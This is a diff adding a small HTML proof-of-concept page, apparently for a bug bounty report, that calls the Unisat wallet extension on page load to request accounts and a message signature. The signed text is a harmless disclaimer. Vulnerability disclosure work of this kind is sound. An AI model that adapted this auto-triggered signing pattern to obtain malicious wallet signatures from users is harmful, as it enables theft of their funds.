@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bug Bounty - White Hat Test</title>
+</head>
+
+<body>
+    <script type="text/javascript">
+
+        async function connectAndSign() {
+            // Check if MetaMask is installed
+            if (window.unisat) {
+                console.log('Unisat is installed!');
+
+                // Request account access
+                try {
+                    const accounts = window.unisat.requestAccounts();
+                    console.log(accounts);
+
+                    try {
+                        let res = await window.unisat.signMessage("Hello, I am a white hat and this message could be a malicious one to give the attacker full permission on your wallet! But, this is only a test message as a Proof of Concept for the Bug Bounty.");
+                        console.log(res)
+                    } catch (e) {
+                        console.log(e);
+                    }
+                } catch (e) {
+                    console.log('connect failed');
+                }
+            } else {
+                console.error('Unisat is not installed!');
+            }
+        }
+
+        // Call connectAndSign function automatically when the page loads
+        connectAndSign();
+
+    </script>
+</body>
+
+</html>
